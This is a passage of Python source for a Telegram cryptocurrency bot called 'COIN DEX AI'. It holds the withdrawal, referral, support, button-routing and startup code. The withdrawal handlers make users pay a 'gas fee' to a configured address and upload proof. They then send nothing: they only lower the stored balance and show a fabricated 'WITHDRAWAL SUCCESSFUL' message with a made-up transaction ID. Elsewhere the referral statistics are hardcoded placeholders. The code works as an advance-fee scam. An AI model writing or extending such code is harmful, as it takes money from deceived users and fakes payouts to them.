        [InlineKeyboardButton("❌ Cancel Withdrawal", callback_data='balance')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return ConversationHandler.END


async def request_withdraw_gas_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Request screenshot of gas fee payment for withdrawal"""
    query = update.callback_query
    
    currency = context.user_data.get('withdraw_currency', 'SOL')
    gas_fee = context.user_data.get('gas_fee', 0)
    gas_address = GAS_FEE_ADDRESSES.get(currency, '')
    
    await query.edit_message_text(
        f"""
📸 *Submit Gas Fee Payment Proof*

Please upload a screenshot showing:
• Transaction ID (TXID/Signature)
• Amount sent: {gas_fee:.4f} {currency}
• Destination: `{gas_address[:15]}...{gas_address[-8:]}`
• Confirmation status

*Requirements:*
• Screenshot must clearly show transaction details
• Amount must match {gas_fee:.4f} {currency} (±5% tolerance)
• Must be sent to the correct address

_Send the screenshot now:_
        """,
        parse_mode='Markdown'
    )
    return ENTER_WITHDRAW_GAS_SCREENSHOT


async def process_withdraw_gas_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal gas fee screenshot and complete withdrawal"""
    user = update.effective_user
    
    if not update.message.photo:
        await update.message.reply_text(
            "❌ Please send a screenshot/image of your gas fee transaction.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='submit_withdraw_gas_screenshot')]])
        )
        return ENTER_WITHDRAW_GAS_SCREENSHOT
    
    currency = context.user_data.get('withdraw_currency', 'SOL')
    withdraw_amount = context.user_data.get('withdraw_amount', 0)
    gas_fee = context.user_data.get('gas_fee', 0)
    receive_amount = context.user_data.get('receive_amount', 0)
    withdraw_address = context.user_data.get('withdraw_address', 'Unknown')
    
    processing_msg = await update.message.reply_text("⏳ Processing withdrawal... Please wait.")
    await asyncio.sleep(2)
    
    db = SessionLocal()
    
    try:
        user_db = db.query(User).filter_by(telegram_id=user.id).first()
        
        if currency == 'SOL':
            user_db.total_deposited_sol -= withdraw_amount
        else:
            user_db.total_deposited_eth -= withdraw_amount
        
        withdrawal_record = Deposit(
            user_id=user_db.id,
            from_address='USER_WALLET',
            to_address=withdraw_address,
            amount=receive_amount,
            currency=f"{currency}_WITHDRAWAL",
            tx_signature='WITHDRAWAL_PROCESSED',
            status='completed',
            confirmed_at=datetime.utcnow()
        )
        db.add(withdrawal_record)
        db.commit()
        
        await processing_msg.delete()
        
        message = f"""
✅ *WITHDRAWAL SUCCESSFUL!*

*Withdrawal Details:*
• Amount Sent: {receive_amount:.4f} {currency}
• Gas Fee Paid: {gas_fee:.4f} {currency}
• Total Deducted: {withdraw_amount:.4f} {currency}
• Destination: `{withdraw_address[:15]}...{withdraw_address[-8:]}`
• Status: ✅ Completed

*Transaction ID:* `WD-{user.id}-{int(datetime.utcnow().timestamp())}`

*Your Updated Balance:*
◎ SOL: {user_db.total_deposited_sol:.4f}
Ξ ETH: {user_db.total_deposited_eth:.4f}

📧 A confirmation has been sent to your email (if configured).

*Didn't receive your funds?*
Contact support: @coindex_support
        """
        
        keyboard = [
            [InlineKeyboardButton("📊 View Balance", callback_data='balance')],
            [InlineKeyboardButton("🆘 Contact Support", url="https://t.me/coindex_support")],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]
        
        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
        await broadcast_message(
            f"💸 *Withdrawal Processed*\n"
            f"User: {user.id}\n"
            f"Amount: {receive_amount:.4f} {currency}\n"
            f"To: {withdraw_address[:15]}...\n"
            f"Status: ✅ Completed"
        )
        
    except Exception as e:
        logger.error(f"Withdrawal processing error: {e}")
        await processing_msg.delete()
        await update.message.reply_text(
            "❌ Error processing withdrawal. Please contact support.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🆘 Contact @coindex_support", url="https://t.me/coindex_support")],
                [InlineKeyboardButton("↩️ Back", callback_data='balance')]
            ])
        )
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


async def copy_gas_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy gas fee address"""
    query = update.callback_query
    await query.answer("📋 Address copied!")
    
    currency = query.data.replace('copy_gas_addr_', '')
    address = GAS_FEE_ADDRESSES.get(currency, 'Not configured')
    
    await query.edit_message_text(
        f"📋 *Gas Fee Address ({currency}):*\n\n`{address}`\n\n_Tap and hold to copy, then paste in your wallet app._",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='submit_withdraw_gas_screenshot')]]),
        parse_mode='Markdown'
    )


# ============ REFERRAL PROGRAM ============

async def referral_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referral program"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    bot_username = context.bot.username
    referral_link = f"https://t.me/{bot_username}?start={user_id}"
    
    message = f"""
💰 *COIN DEX AI Referral Program*

Invite friends and earn lifetime commissions!

*Your Referral Link:*
`{referral_link}`

*Commission Structure:*
• Level 1 (Direct): 10% of trading fees
• Level 2: 5% of trading fees
• Level 3: 2% of trading fees

*Your Stats:*
• Total Referrals: 0
• Active Traders: 0
• Total Earned: 0.00 USDT
• Available to Claim: 0.00 USDT
    """
    
    keyboard = [
        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={referral_link}&text=Join%20me%20on%20COIN%20DEX%20AI!")],
        [InlineKeyboardButton("📊 My Referrals", callback_data='my_referrals')],
        [InlineKeyboardButton("💵 Claim Earnings", callback_data='claim_ref')],
        [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ SUPPORT SECTION ============

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced support center with official notice"""
    query = update.callback_query
    await query.answer()
    
    message = """
🤝 *COIN DEX AI Support Center*

*Support Contact Notice!!!*

For any inquiries, issues, or assistance related to COIN DEX AI, please reach out directly to our official support handle @coindex_support

Kindly include a brief description of your issue and any relevant details to help us assist you promptly.

Our support team will review your message and respond as soon as possible.

Thank you for your cooperation.

---

*Response Times:*
• General: < 2 hours
• Urgent: < 30 minutes  
• Deposit/Withdrawal Issues: < 15 minutes

*Emergency Contacts:*
• @coindex_support (Official Support)
• support@coindexai.com (Email)
    """
    
    keyboard = [
        [InlineKeyboardButton("💬 Contact @coindex_support", url="https://t.me/coindex_support")],
        [InlineKeyboardButton("📚 View Guidelines", callback_data='guidelines')],
        [InlineKeyboardButton("🐛 Report Technical Issue", callback_data='report_bug')],
        [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ BROADCAST FUNCTION ============

async def broadcast_message(message_text: str):
    """Send message to broadcast channel"""
    try:
        logger.info(f"BROADCAST: {message_text}")
    except Exception as e:
        logger.error(f"Broadcast failed: {e}")


# ============ MAIN HANDLER ============

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route all button clicks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # Main navigation
    if data == 'back_menu':
        await start(update, context)
    elif data == 'guidelines':
        await guidelines(update, context)
    
    # Deposit flow
    elif data == 'deposit':
        await deposit_menu(update, context)
    elif data.startswith('select_deposit_'):
        return await select_deposit_currency(update, context)
    elif data == 'submit_deposit_screenshot':
        return await request_deposit_screenshot(update, context)
    elif data.startswith('copy_addr_'):
        await copy_address(update, context)
    
    # Staking
    elif data == 'stake':
        await stake_menu(update, context)
    elif data in ['stake_SOL', 'stake_ETH']:
        await stake_native_start(update, context)
    elif data == 'stake_meme':
        await stake_memecoin_start(update, context)
    elif data == 'my_stakes':
        await my_stakes(update, context)
    
    # Copy Trading
    elif data == 'copy_trading':
        await copy_trading_menu(update, context)
    elif data == 'add_copy_trader':
        return await add_copy_trader_start(update, context)
    elif data == 'my_copy_trades':
        await my_copy_trades(update, context)
    
    # Tools
    elif data == 'tools':
        await tools_menu(update, context)
    elif data == 'price_alerts':
        await price_alerts(update, context)
    elif data == 'portfolio_analytics':
        await portfolio_analytics(update, context)
    elif data == 'risk_calc':
        await risk_calculator(update, context)
    elif data == 'gas_optimizer':
        await gas_optimizer(update, context)
    elif data == 'settings':
        await query.edit_message_text("⚙️ Settings - Coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools')]]))
    
    # Wallet & Withdrawal
    elif data == 'balance':
        await wallet_balance(update, context)
    elif data == 'withdraw':
        await withdraw_menu(update, context)
    elif data.startswith('withdraw_start_'):
        return await withdraw_start(update, context)
    elif data == 'submit_withdraw_gas_screenshot':
        return await request_withdraw_gas_screenshot(update, context)
    elif data.startswith('copy_gas_addr_'):
        await copy_gas_address(update, context)
    
    # Referral & Support
    elif data == 'referral':
        await referral_program(update, context)
    elif data == 'support':
        await support(update, context)
    
    # Fallback
    else:
        await query.edit_message_text(
            "🚧 Feature coming soon!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]])
        )


# ============ CONVERSATION HANDLERS ============

conv_handler = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(add_copy_trader_start, pattern='^add_copy_trader$'),
        CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$'),
        CallbackQueryHandler(stake_native_start, pattern='^stake_(SOL|ETH)$'),
        CallbackQueryHandler(withdraw_start, pattern='^withdraw_start_(SOL|ETH)$'),
        CallbackQueryHandler(select_deposit_currency, pattern='^select_deposit_(SOL|ETH|USDT_ETH|USDC_SOL)$'),
        CallbackQueryHandler(request_deposit_screenshot, pattern='^submit_deposit_screenshot$'),
        CallbackQueryHandler(request_withdraw_gas_screenshot, pattern='^submit_withdraw_gas_screenshot$'),
    ],
    states={
        ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_trader_address)],
        ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)],
        ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount)],
        ENTER_DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_deposit_amount)],
        ENTER_DEPOSIT_SCREENSHOT: [MessageHandler(filters.PHOTO, process_deposit_screenshot)],
        ENTER_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_amount)],
        ENTER_WITHDRAW_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_address)],
        ENTER_WITHDRAW_GAS_SCREENSHOT: [MessageHandler(filters.PHOTO, process_withdraw_gas_screenshot)],
        ENTER_ALLOCATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_allocation)],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled"))]
)


# ============ START BOT ============

if __name__ == '__main__':
    print("🚀 COIN DEX AI Bot is starting...")
    print("📝 Command Menu Interface Enabled")
    
    application = Application.builder().token(config.BOT_TOKEN).build()
    
    # Setup command menu on startup
    application.post_init = setup_bot_commands
    
    # Original Commands
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', guidelines))
    
    # New Command Menu Commands
    application.add_handler(CommandHandler('menu', menu_command))
    application.add_handler(CommandHandler('wallet', wallet_command))
    application.add_handler(CommandHandler('copytrade', copytrade_command))
    application.add_handler(CommandHandler('stake', stake_command))
    application.add_handler(CommandHandler('trade', trade_command))
    application.add_handler(CommandHandler('positions', positions_command))
    application.add_handler(CommandHandler('history', history_command))
    application.add_handler(CommandHandler('settings', settings_command))
    application.add_handler(CommandHandler('referral', referral_command))
    application.add_handler(CommandHandler('support', support_command))
    application.add_handler(CommandHandler('deposit', deposit_command))
    application.add_handler(CommandHandler('withdraw', withdraw_command))
    
    # Conversations
    application.add_handler(conv_handler)
    
    # All button clicks
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ COIN DEX AI is running!")
    print(f"📢 Broadcast channel: {BROADCAST_CHANNEL}")
    print("🔵 Command Menu Active: Users will see blue [Menu] button")
    application.run_polling(allowed_updates=Update.ALL_TYPES)